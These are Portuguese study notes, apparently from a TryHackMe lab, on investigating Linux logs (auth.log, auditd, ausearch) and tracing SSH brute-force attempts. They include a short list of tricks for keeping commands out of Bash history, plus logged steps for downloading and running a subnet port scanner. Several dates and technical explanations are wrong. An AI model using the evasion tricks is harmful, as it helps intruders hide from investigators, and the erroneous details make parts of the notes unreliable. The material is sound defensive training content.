O monitoramento de segurança no linux envolve checar logs gerados pelo sistema, que não seguem exatamente um estrutura de fácil compreensão. A maioria dos logs são armazenados na pasta /var/log, como syslog (arquivos e diretórios importantes), messages (log geral), auth.log (autenticação), secure (segurança), kern.log (kernel), apache2, nginx, audit, journal (logs binários do systemd).
> Investigando

Utilizando a pasta /var/log e o arquivo syslog, é possível identificar, com os comandos cat e grep, o domínio em que a máquina virtual se conecta para sincronizar o tempo, no caso “ntp.ubuntu.com” e conferir a mensagem deixada por Yama → “becoming mindful”
```
ubuntu@thm-vm:/var/log$ cat syslog | grep sync
2025-08-13T13:41:48.184089+00:00 thm-vm systemd[1]: Starting systemd-timesyncd.service - Network Time Synchronization...
2025-08-13T13:41:48.184498+00:00 thm-vm systemd[1]: Started systemd-timesyncd.service - Network Time Synchronization.
2025-08-13T13:41:48.184973+00:00 thm-vm systemd-timesyncd[275]: Network configuration changed, trying to establish connection.
2025-08-13T13:41:48.185026+00:00 thm-vm systemd-timesyncd[275]: Network configuration changed, trying to establish connection.
2025-08-13T13:41:48.188749+00:00 thm-vm systemd[1]: rsync.service - fast remote file copy program daemon was skipped because of an unmet condition check (ConditionPathExists=/etc/rsyncd.conf).
2025-08-13T13:41:48.197983+00:00 thm-vm systemd-timesyncd[275]: Network configuration changed, trying to establish connection.
2025-08-13T13:42:17.819639+00:00 thm-vm systemd-timesyncd[275]: Contacted time server 185.125.190.58:123 **(ntp.ubuntu.com)**.
```
O servidor NTP utilizado foi **`ntp.ubuntu.com`**.

```
ubuntu@thm-vm:/var/log$ cat syslog | grep Yama
2025-08-13T13:41:48.176653+00:00 thm-vm kernel: Yama: becoming mindful.
2025-08-13T13:57:19.908956+00:00 thm-vm kernel: Yama: becoming mindful.
2025-08-28T14:02:07.691523+00:00 thm-vm kernel: Yama: becoming mindful.
2025-09-09T13:45:41.659300+00:00 thm-vm kernel: Yama: becoming mindful.
2026-06-01T16:11:28.048733+00:00 thm-vm kernel: Yama: becoming mindful.
```
O primeiro tipo de log a ser verificado deve ser de autenticação (auth.log e secure) que possuem o formato: horário | nome do host | processo (ID) | mensagem do processo

Eventos de login e logout são documentados e armazenados, por isso é possível visualizá-los através de termos como “session opened” e “session closed” (log1). Além procurar pelo comportamento dos usuários, como com atividades administrativas (log2). Observo a partir do log “auth.log” que o usuário “xerxes” foi adicionado ao grupo “sudo” (log3) e o usuário de endereço “10.14.94.82” tentou realizar vários logins que não tiveram sucesso (log4).

<details>
  <summary>exemplos</summary>
  <details>
    <summary>log1</summary>
    
    2026-06-02T10:24:44.440610+00:00 thm-vm ➡️sshd[1061]: Server listening on :: port 22.
    2026-06-02T10:24:44.644359+00:00 thm-vm sshd[1062]: Accepted password for ubuntu from 10.64.111.123 port 40482 ssh2
    2026-06-02T10:24:44.647087+00:00 thm-vm sshd[1062]: pam_unix(sshd:session): ➡️session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
    2026-06-02T10:24:44.746131+00:00 thm-vm (systemd): pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
    2026-06-02T10:25:01.213018+00:00 thm-vm CRON[1222]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
    2026-06-02T10:25:01.218605+00:00 thm-vm CRON[1222]: pam_unix(cron:session): ➡️session closed for user root
  </details>
  <details>
    <summary>log2</summary>
      
      #utilizo colchetes e barra porque o comando vem acompanhado de colcehetes e barras, muitas vezes
      ubuntu@thm-vm:/var/log$ cat auth.log | grep -E '(passwd|useradd|usermod|userdel)\['
      2025-08-12T16:57:14.041403+00:00 thm-vm ➡️passwd[1388]: pam_unix(passwd:chauthtok): password changed for ubuntu
      2025-08-12T16:57:22.894189+00:00 thm-vm passwd[1389]: pam_unix(passwd:chauthtok): password changed for ubuntu
      2025-08-13T18:04:10.580438+00:00 thm-vm ➡️useradd[1451]: new group: name=xerxes, GID=1001
      2025-08-13T18:04:10.580683+00:00 thm-vm useradd[1451]: new user: name=xerxes, UID=1001, GID=1001, home=/home/xerxes, shell=/bin/sh, from=/dev/pts/1
      2025-08-13T18:04:29.425939+00:00 thm-vm ➡️usermod[1458]: add 'xerxes' to group 'sudo'
      2025-08-13T18:04:29.426146+00:00 thm-vm usermod[1458]: add 'xerxes' to shadow group 'sudo'
      2025-08-28T14:02:07.694443+00:00 thm-vm passwd[580]: password for 'ubuntu' changed by 'root'
      2026-06-02T10:24:36.430029+00:00 thm-vm passwd[589]: password for 'ubuntu' changed by 'root'

  </details>
  <details>
    <summary>log3</summary>
    
    ubuntu@thm-vm:/var/log$ cat auth.log | grep -E "\ (usermod|sudo)\[" 
    2025-08-13T18:04:29.425939+00:00 thm-vm usermod[1458]: add 'xerxes' to group 'sudo'
    2025-08-13T18:04:29.426146+00:00 thm-vm usermod[1458]: add 'xerxes' to shadow group 'sudo'
  </details>
  <details>
    <summary>log4</summary>
    
    ubuntu@thm-vm:/var/log$ cat auth.log | grep "ssh" |  grep -E "(denied|refused|failure)" 
    2025-08-13T15:56:17.026492+00:00 thm-vm sshd[1176]: pam_unix(sshd:auth): authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82  user=root
    2025-08-13T15:56:29.897173+00:00 thm-vm sshd[1192]: pam_unix(sshd:auth): authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82 
    2025-08-13T15:56:37.349605+00:00 thm-vm sshd[1192]: PAM 1 more authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82 
    2025-08-13T15:56:44.867248+00:00 thm-vm sshd[1194]: pam_unix(sshd:auth): authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82 
    2025-08-13T15:56:54.998731+00:00 thm-vm sshd[1194]: PAM 1 more authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82
    2025-08-13T15:56:59.807410+00:00 thm-vm sshd[1196]: pam_unix(sshd:auth): authentication ➡️failure; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=10.14.94.82  user=root
  </details>
</details>

Uma forma de visualizar comandos previamente utilizados em outras sessões, além de history - datawookie Configuring Bash History on Linux – datawookie, é possível utilizar o arquivo “bash_history” que armazena comandos de outras sessões. Exemplo:

```
ubuntu@thm-vm:/var/log$ cat /home/ubuntu/.bash_history
sudo su
sudo su
sudo su
sudo apt install zip unzip
passwd
```

Além disso, atacantes encontram outras formas para não aparecerem nos logs, como adicionar um espaço antes do início do comando, utilizam scripts que possuem nomes legítimos ou utilizam outros shells que não são armazenados, como /bin/sh.

```
# Attackers can simply add a leading space to the command to avoid being logged
ubuntu@thm-vm:~$  echo "You will never see me in logs!"

# Attackers can paste their commands in a script to hide them from Bash history
ubuntu@thm-vm:~$ nano legit.sh && ./legit.sh
 
# Attackers can use other shells like /bin/sh that don't save the history like Bash
ubuntu@thm-vm:~$ sh
$ echo "I am no longer tracked by Bash!"
```

> Investigando

Consigo visualizar qual pacote de unzip e sua versão foi instalada:

```
root@thm-vm:/var/log$ cat dpkg.log | grep "unzip"
2025-08-12 16:41:24 install unzip:amd64 <none> 6.0-28ubuntu4.1
2025-08-12 16:41:24 status half-installed unzip:amd64 6.0-28ubuntu4.1
2025-08-12 16:41:25 status unpacked unzip:amd64 6.0-28ubuntu4.1
2025-08-12 16:41:25 configure unzip:amd64 6.0-28ubuntu4.1 <none>
2025-08-12 16:41:25 status unpacked unzip:amd64 6.0-28ubuntu4.1
2025-08-12 16:41:25 status half-configured unzip:amd64 6.0-28ubuntu4.1
2025-08-12 16:41:25 status installed unzip:amd64 6.0-28ubuntu4.1
```
Como monitorar logs pode ser cansativo e pode acabar levando o analista a não encontrar alertas verdadeiros, a ferramenta auditd (audit daemon - https://github.com/Neo23x0/auditd/blob/master/audit.rules) é utilizada como o sysmon do windows que monitora as system calls (que são chamadas feitas pelo sistema operacional por funções do kernel - ação de baixo nível) . Permite a criação de regras que seguem o formato:

`-a always,exit -S system call -F filtro -F tags` 

Exemplo: `-a always,exit -F arch=b64 -S sethostname -S setdomainname -k network_modifications` → muda para o hostname atual

É possível encontrar essas regras em: `/etc/audit/rules.d` ou `/var/log/audit/audit.log` , porém é mais fácil acessar pelo programa ausearch. O comando básico que retorna o conteúdo mais fácil de ler é: `auditsearch -i -k arquivo.log` que retorna o output, como:

```
root@thm-vm:/$ ausearch -i -k file_sshconf
----
type=PROCTITLE msg=audit(08/13/25 13:41:41.596:57) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
type=CWD msg=audit(08/13/25 13:41:41.596:57) : cwd=/ 
type=SOCKADDR msg=audit(08/13/25 13:41:41.596:57) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
type=SYSCALL msg=audit(08/13/25 13:41:41.596:57) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffd77e095f0 a2=0x434 a3=0x0 items=1 ppid=293 pid=342 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
type=CONFIG_CHANGE msg=audit(08/13/25 13:41:41.596:57) : auid=unset ses=unset subj=unconfined op=add_rule key=file_sshconf list=exit res=yes 
----
```
Mas ainda pode não ser tão fácil de ler, então há outras alternativas como: sysmon for linux (SysmonForLinux), falco (Falco Falco), osquery (Osquery) e EDR.

> Investigando

Quero descobrir qual foi a primeira vez que o arquivo “secret.thm” foi aberto e para isso preciso acessar o arquivo “file_thmsecret” que contém os eventos de system calls. Utilizando o programa ausearch consigo visualizar que o arquivo fora aberto em “08/13/25 18:36:54”:
```
type=PROCTITLE msg=audit(08/13/25 18:36:54.574:1600) : proctitle=cat /secret.thm 
type=CWD msg=audit(08/13/25 18:36:54.574:1600) : cwd=/root 
type=SYSCALL msg=audit(08/13/25 18:36:54.574:1600) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x7ffd133b973a a2=O_RDONLY a3=0x0 items=1 ppid=1542 pid=1578 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=30 comm=cat exe=/usr/bin/cat subj=unconfined key=file_thmsecret
```
Visualizo também pacotes que foram instalados através do wget utilizando a chave “proc_wget” e descubro que o arquivo “naabu_2.3.5_linux_amd64.zip” que realmente foi instalado:
```
type=EXECVE msg=audit(08/13/25 18:29:14.700:1523) : argc=4 a0=wget a1=https://github.com/projectdiscovery/naabu/releases/download/v2.3.5/naabu_2.3.5_linux_amd64.zip a2=-O a3=/tmp/naabu.zip
```
Preciso encontrar o intervalo de rede em que alguma ferramenta foi utilizada, mas sem saber o nome da ferramenta, então preciso verificar os logs audit.log que está em:
```
ubuntu@thm-vm:~$ find / -name "audit.log" 2>/dev/null
/var/log/audit/audit.log
```

Observando o log audit.log, observo que uma ferramenta foi baixada chamada: naabu e pesquisando sobre descubro ser um scanner de rede, então procuro os logs dessa ferramenta com:
```
ubuntu@thm-vm:/var/log/audit$ ausearch -i | grep "naabu"
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
type=PROCTITLE msg=audit(08/13/25 18:29:14.700:1523) : proctitle=wget https://github.com/projectdiscovery/naabu/releases/download/v2.3.5/naabu_2.3.5_linux_amd64.zip -O /tmp/naabu.zip
type=EXECVE msg=audit(08/13/25 18:29:14.700:1523) : argc=4 a0=wget a1=https://github.com/projectdiscovery/naabu/releases/download/v2.3.5/naabu_2.3.5_linux_amd64.zip a2=-O a3=/tmp/naabu.zip 
type=PROCTITLE msg=audit(08/13/25 18:29:25.214:1524) : proctitle=unzip naabu.zip 
type=EXECVE msg=audit(08/13/25 18:29:25.214:1524) : argc=2 a0=unzip a1=naabu.zip 
type=PROCTITLE msg=audit(08/13/25 18:29:45.152:1526) : proctitle=chmod +x naabu 
type=EXECVE msg=audit(08/13/25 18:29:45.152:1526) : argc=3 a0=chmod a1=+x a2=naabu 
type=PROCTITLE msg=audit(08/13/25 18:29:51.986:1527) : proctitle=./naabu -host 192.168.50.0/24 -top-ports
type=EXECVE msg=audit(08/13/25 18:29:51.986:1527) : argc=5 a0=./naabu a1=-host a2=192.168.50.0/24 a3=-top-ports a4=100 
type=SYSCALL msg=audit(08/13/25 18:29:51.986:1527) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6252c36af5a0 a1=0x6252c36af630 a2=0x6252f61106d8 a3=0x8 items=2 ppid=1499 pid=1504 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=30 comm=naabu exe=/tmp/naabu subj=unconfined key=proc_all
```
E descubro que o usuário realizou um scan de 100 portas na rede 192.168.50.0/24.

> [!TIP]
> `proc_all` é um diretório virtual que contém informações em tempo real sobre desempenho, processos ativos, hardware
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
A forma mais comum de acessar uma máquina remotamente é via ssh em linux, windows utiliza RDP, que não costuma ser muito bem protegido utilizando senhas fracas, ficando extremamente suscetíveis a ataques de força bruta. Essas chaves podem ser roubadas por data stealers facilmente ou por servidores expostos que podem estar obsoletos.
Ataques por SSH seguem um padrão: múltiplos logins seguidos por um bem sucedido, logins por um endereço externo não identificado, logins por um método inseguro como senhas e a combinação desses indicadores. Além disso, mais investigação é necessária sobre o username, endereço IP de origem, histórico de login e intervalo de tentativas.

Os logs por si só podem não ser suficientes, mas continuam sendo uma fonte rica de informações, como o tipo de ataque através dos comandos, qual fase do ataque o atacante está, o endereço IP do atacante e a vulnerabilidade do sistema explorado. Além disso, podem ajudar a construir uma árvore de processos que consiste em rastrear ID de processos para configurar todo o processo de acesso inicial feito pelo atacante. Exemplo:
![imagem](caminho imagem)
(https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps)

Com isso, é interessante utilizar a ferramenta ausearch para identificar o comportamento seguido dos comandos. Para isso, basta procurar as system calls primeiro do comando, depois dos processos pai até chegar ao ID=1, que é o processo base. Depois, basta listar todos os processos filhos utilizando algo como: ausearch -i --ppid ID_processo | grep 'proctitle'

> Investigando

Uma equipe de segurança recebeu a solicitação de analisar os registros de autenticação de um servidor Linux após atividades administrativas terem sido realizadas remotamente. Como parte da investigação, é necessário reconstruir o histórico de acessos do usuário `ubuntu`, identificando quando ocorreu sua primeira conexão ao servidor por meio do protocolo SSH e verificando qual método de autenticação foi utilizado. 

A análise dos logs permitirá determinar se o acesso foi realizado por senha ou por chaves SSH, fornecendo uma visão mais clara sobre os mecanismos de autenticação empregados no ambiente.

Inicio recuperando eventos sshd com grep “sshd” e descubro que o usuário ubuntu realizou a primeira conexão em 20 de outubro de 2024 às 8:28 utilizando chaves ssh ao invés de senha:

```
Oct 22 08:28:00 ip-10-10-249-101 sshd[809]: Accepted publickey for ubuntu from 10.9.254.186 port 64824 ssh2: RSA SHA256:krhp4o9yYOyVKmAd7PAsdHrKQGJtjIQjt4w0K9R4kXg
Oct 22 08:28:00 ip-10-10-249-101 sshd[809]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```
Isso indica uma tentativa de ataque SSH, então agora é preciso reunir detalhes sobre o ataque e conferir o que foi vazado. 

Observando as datas dos eventos, percebo 6 períodos diferentes: 21/08/2025, 28/08/2025, 02/09/2025, 10/09/2025, 22/10/2025 e 03/06/2026. 

- 21 de agosto de 2025:
    
    O sistema começa alterando a senha do usuário ubuntu automaticamente e verifica os hardwares virtuais da nuvem, conferindo se algum botão virtual foi pressionado ou algum dispositivo, como um teclado, foi adicionado (log1). Depois ajusta a saída do conteúdo para o seat0, carrega e executa regras de segurança da ferramenta polkit → segurança interna do linux (log2). Após isso, ativou o serviço ssh, habilitando a porta 22, realiza um login com a chave criptográfica e cria uma nova sessão para o usuário que acabou de logar (log3). Depois conseguiu acesso privilegiado através de sudo su “COMMAND=/usr/bin/su”, abrindo uma sessão su[1159] e apresenta o sistema organizando a tela “(to root) root on pts/1” para disponibilizar o novo terminal. Depois, recarregou as regras do Polkit, que é um daemon, para limpar a memória “garbage collection” e recarregar diretivas nos diretórios `/etc/polkit-1/rules.d` e `/usr/share/polkit-1/rules.` (log4)
    
    Após isso, o usuário acessa o arquivo lograted.d, que higieniza os logs, executando como sudo e iniciando uma nova sessão dentro de uma mesma sessão, aplicando as alterações com um reboot (log5). Então, com o serviço ssh ativo, o usuário acessa o sistema como ubuntu, criando uma nova sessão, e inicia o terminal privilegiado novamente (log6). Um detalhe interessante é que o usuário modificou o nome do servidor de “tryhackme-2404” para “thm-vm”, possivelmente quando acessou o terminal privilegiado. Então, o usuário realizou um ataque de força bruta ao tentar acessar o servidor com credenciais erradas através do endereço “197.39.195.136”, então o sistema encerrou a sessão para garantir a integridade do sistema (log7). Observando mais à frente que o mesmo usuário (ou bot) continuou tentando acesso à conta root através de diferentes endereços IP (log8).
  <details>
    <summary>logs 21/08/2026</summary>
    <details>
      <summary>log1</summary>
      
        2025-08-21T14:27:40.428905+00:00 tryhackme-2404 passwd[584]: password for 'ubuntu' changed by 'root'
        2025-08-21T14:27:40.444072+00:00 tryhackme-2404 systemd-logind[623]: Watching system buttons on /dev/input/event0 (Power Button)
        2025-08-21T14:27:40.444077+00:00 tryhackme-2404 systemd-logind[623]: Watching system buttons on /dev/input/event1 (Sleep Button)
        2025-08-21T14:27:40.444083+00:00 tryhackme-2404 systemd-logind[623]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
    </details>
    <details>
      <summary>log2</summary>
      
      2025-08-21T14:27:40.444095+00:00 tryhackme-2404 systemd-logind[623]: ➡️New seat seat0.
      2025-08-21T14:27:40.648420+00:00 tryhackme-2404 polkitd[775]: ➡️Loading rules from directory /etc/polkit-1/rules.d
      2025-08-21T14:27:40.648537+00:00 tryhackme-2404 polkitd[775]: ➡️Loading rules from directory /usr/share/polkit-1/rules.d
      2025-08-21T14:27:40.651667+00:00 tryhackme-2404 polkitd[775]: ➡️Finished loading, compiling and executing 4 rules
      2025-08-21T14:27:40.665688+00:00 tryhackme-2404 polkitd[775]: Acquired the name org.freedesktop.PolicyKit1 on the system bus
    </details>
    <details>
      <summary>log3</summary>
      
      2025-08-21T14:31:42.932255+00:00 tryhackme-2404 sshd[1012]: ➡️Server listening on :: port 22.
      2025-08-21T14:31:44.814918+00:00 tryhackme-2404 sshd[1013]: ➡️Accepted publickey for ubuntu from 10.14.105.255 port 18442 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
      2025-08-21T14:31:44.818889+00:00 tryhackme-2404 sshd[1013]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
      2025-08-21T14:31:44.842383+00:00 tryhackme-2404 systemd-logind[623]: ➡️New session 1 of user ubuntu.
      2025-08-21T14:31:44.867201+00:00 tryhackme-2404 (systemd): pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
    </details>
    <details>
      <summary>log4</summary>
      
      2025-08-21T14:31:50.645675+00:00 tryhackme-2404 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; ➡️COMMAND=/usr/bin/su
      2025-08-21T14:31:50.646777+00:00 tryhackme-2404 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
      2025-08-21T14:31:50.656103+00:00 tryhackme-2404 su[1159]: (to root) root on pts/1
      2025-08-21T14:31:50.656581+00:00 tryhackme-2404 su[1159]: pam_unix(su:session): ➡️session opened for user root(uid=0) by ubuntu(uid=0)
    </details>
    <details>
      <summary>log5</summary>
      
      2025-08-21T14:41:04.729505+00:00 ➡️tryhackme-2404 sudo:     root : TTY=pts/1 ; ➡️PWD=/etc/logrotate.d ; USER=root ; COMMAND=/usr/bin/su
      2025-08-21T14:41:04.731425+00:00 tryhackme-2404 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=0)
      2025-08-21T14:41:04.743288+00:00 tryhackme-2404 su[27111]: ➡️(to root) root on pts/2
      2025-08-21T14:41:04.743887+00:00 tryhackme-2404 su[27111]: pam_unix(su:session): session opened for user root(uid=0) by ubuntu(uid=0)
      2025-08-21T14:41:27.928253+00:00 tryhackme-2404 systemd-logind[623]: The system will reboot now!
      2025-08-21T14:41:27.956876+00:00 tryhackme-2404 systemd-logind[623]: System is rebooting.
    </details>
    <details>
      <summary>log6</summary>
      
      2025-08-21T15:22:17.332863+00:00 ➡️thm-vm sshd[947]: ➡️Server listening on 0.0.0.0 port 22.
      2025-08-21T15:22:17.334287+00:00 thm-vm sshd[947]: Server listening on :: port 22.
      2025-08-21T15:22:17.752969+00:00 thm-vm sshd[948]: Accepted publickey for ubuntu from ➡️10.14.105.255 port 33903 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
      2025-08-21T15:22:17.755639+00:00 thm-vm sshd[948]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
      2025-08-21T15:22:17.780850+00:00 thm-vm systemd-logind[568]: ➡️New session 6 of user ubuntu.
      2025-08-21T15:22:17.809433+00:00 thm-vm (systemd): pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
      2025-08-21T15:22:26.322753+00:00 thm-vm sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; ➡️COMMAND=/usr/bin/su
    </details>
    <details>
      <summary>log7</summary>
      
      2025-08-21T15:22:26.323883+00:00 thm-vm sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
      2025-08-21T15:22:26.332614+00:00 thm-vm su[1091]: (to root) root on pts/1
      2025-08-21T15:22:26.333162+00:00 thm-vm su[1091]: pam_unix(su:session): session opened for user root(uid=0) by ubuntu(uid=0)
      2025-08-21T15:25:01.485786+00:00 thm-vm CRON[1102]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
      2025-08-21T15:25:01.489937+00:00 thm-vm CRON[1102]: pam_unix(cron:session): session closed for user root
      2025-08-21T16:34:02.324405+00:00 thm-vm sshd[18432]: pam_unix(sshd:auth): ➡️authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=197.39.195.136  user=root
      2025-08-21T16:34:04.201269+00:00 thm-vm sshd[18432]: ➡️Failed password for root from 197.39.195.136 port 47942 ssh2
      2025-08-21T16:34:35.835761+00:00 thm-vm sshd[18432]: Connection closed by authenticating user root 197.39.195.136 port 47942 [preauth]
    </details>
    <details>
      <summary>log8</summary>
      
      2025-08-21T16:38:44.936767+00:00 thm-vm sshd[18479]: Invalid user sol from 193.32.162.145 port 46702
      2025-08-21T16:38:45.105443+00:00 thm-vm sshd[18479]: pam_unix(sshd:auth): check pass; user unknown
      2025-08-21T16:38:45.105708+00:00 thm-vm sshd[18479]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.32.162.145
      2025-08-21T16:38:47.168117+00:00 thm-vm sshd[18479]: Failed password for invalid user sol from 193.32.162.145 port 46702 ssh2
      2025-08-21T16:38:47.491436+00:00 thm-vm sshd[18479]: Connection closed by invalid user sol 193.32.162.145 port 46702 [preauth]
      2025-08-21T16:39:52.600027+00:00 thm-vm sshd[18482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.33  user=root
      2025-08-21T16:39:54.526886+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
      2025-08-21T16:39:58.381234+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
      2025-08-21T16:40:02.099936+00:00 thm-vm sshd[18482]: Failed password for root from 193.46.255.33 port 47526 ssh2
      2025-08-21T16:40:03.511907+00:00 thm-vm sshd[18482]: Received disconnect from 193.46.255.33 port 47526:11:  [preauth]
      2025-08-21T16:40:03.512123+00:00 thm-vm sshd[18482]: Disconnected from authenticating user root 193.46.255.33 port 47526 [preauth]
      2025-08-21T16:40:03.512183+00:00 thm-vm sshd[18482]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.33  user=root
      2025-08-21T16:40:04.777119+00:00 thm-vm sshd[18486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.33  user=root
      2025-08-21T16:40:06.684926+00:00 thm-vm sshd[18486]: Failed password for root from 193.46.255.33 port 62166 ssh2
      2025-08-21T16:40:14.054516+00:00 thm-vm sshd[18486]: message repeated 2 times: [ Failed password for root from 193.46.255.33 port 62166 ssh2]
      2025-08-21T16:40:15.680051+00:00 thm-vm sshd[18486]: Received disconnect from 193.46.255.33 port 62166:11:  [preauth]
      2025-08-21T16:40:15.680216+00:00 thm-vm sshd[18486]: Disconnected from authenticating user root 193.46.255.33 port 62166 [preauth]
      2025-08-21T16:40:15.680289+00:00 thm-vm sshd[18486]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.33  user=root
      2025-08-21T16:40:16.944043+00:00 thm-vm sshd[18488]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.33  user=root
      2025-08-21T16:40:18.831953+00:00 thm-vm sshd[18488]: Failed password for root from 193.46.255.33 port 43344 ssh2
      2025-08-21T16:40:20.775101+00:00 thm-vm sshd[18490]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.88.8.186  user=root
      2025-08-21T16:40:23.021683+00:00 thm-vm sshd[18488]: Failed password for root from 193.46.255.33 port 43344 ssh2
      2025-08-21T16:40:23.214423+00:00 thm-vm sshd[18490]: Failed password for root from 45.88.8.186 port 34026 ssh2
      2025-08-21T16:40:24.861877+00:00 thm-vm sshd[18490]: Connection closed by authenticating user root 45.88.8.186 port 34026 [preauth]
      .
      .
      .
      2025-08-21T17:22:15.046851+00:00 thm-vm sshd[18602]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= ➡️rhost=193.46.255.7  user=root
    </details>
  </details>

- 28 de agosto de 2025:
    
    Novamente altera a senha do usuário ubuntu, inicia o serviço ssh e habilita o usuário ubuntu (log1). Então o usuário acessa o arquivo “bash.bashrc” às 11:52 e novamente às 11:53, o que pode indicar possível injeção de script para pesistência, in (log2). Por fim, encerra a conexão (log3), repetindo o processo de conexão.
  <details>
    <summary>logs 28/08/2025</summary>
    <details>
      <summary>log1</summary>
        
          2025-08-28T11:51:24.671124+00:00 thm-vm sshd[885]: Server listening on 0.0.0.0 port 22.
          2025-08-28T11:51:24.671303+00:00 thm-vm sshd[885]: ➡️Server listening on :: port 22.
          2025-08-28T11:51:24.737937+00:00 thm-vm sshd[886]: Connection closed by 10.100.100.159 port 54353
          2025-08-28T11:51:48.242199+00:00 thm-vm sshd[1209]: ➡️Accepted publickey for ubuntu from 10.14.105.255 port 12199 ssh2: RSA SHA256:oj8xLijWySiv2Jzh/N9DI1upm+hMm9zZJ6hw6LMDEHc
          2025-08-28T11:51:48.247389+00:00 thm-vm sshd[1209]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)
          2025-08-28T11:51:48.271963+00:00 thm-vm systemd-logind[636]: New session 1 of user ubuntu.
    </details>
    <details>
      <summary>log2</summary>
        
        2025-08-28T11:54:19.384138+00:00 thm-vm sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; ➡️COMMAND=/usr/bin/su
        2025-08-28T11:54:19.385385+00:00 thm-vm sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
        2025-08-28T11:54:19.394517+00:00 thm-vm su[1384]: (to root) root on pts/1
        2025-08-28T11:53:46.533671+00:00 thm-vm sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; ➡️COMMAND=/usr/bin/nano /etc/bash.bashrc
    </details>
    <details>
      <summary>log3</summary>
  
        2025-08-28T11:54:19.395051+00:00 thm-vm su[1384]: pam_unix(su:session): session opened for user root(uid=0) by ubuntu(uid=0)
        2025-08-28T11:55:45.094799+00:00 thm-vm su[1384]: pam_unix(su:session): session closed for user root
        2025-08-28T11:55:45.096868+00:00 thm-vm sudo: pam_unix(sudo:session): session closed for user root
        2025-08-28T11:55:46.967470+00:00 thm-vm sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; ➡️COMMAND=/usr/bin/su
        2025-08-28T11:56:29.829903+00:00 thm-vm sshd[1302]: ➡️Received disconnect from 10.14.105.255 port 12199:11: disconnected by user
        2025-08-28T11:56:29.834125+00:00 thm-vm sshd[1302]: Disconnected from user ubuntu 10.14.105.255 port 12199
        2025-08-28T11:56:29.834299+00:00 thm-vm sshd[1209]: pam_unix(sshd:session): session closed for user ubuntu
        2025-08-28T11:56:29.835269+00:00 thm-vm systemd-logind[636]: Session 1 logged out. Waiting for processes to exit.
    </details>
  </details>

- 02 de setembro de 2025:
    
    Novamente acesso por ssh, alteração de senha e reinicialização do polkit.
    

E assim continua nas datas: 10 de setembro de 2025, 22 de outubro de 2025 e 08 de junho de 2026. O atacante tentou fazer login com os seguintes nomes de usuário: root, roy, sol, user. Além de que o ip responsável pelo vazamento do usuário “root” foi 91.224.92.79 e pelo usuário ubuntu 10.64.91.229.

<details>
  <summary>nomes de usuário</summary>
  <details>
    <summary>1</summary>
    
    ubuntu@thm-vm:~$ cat auth.log | grep "invalid user"
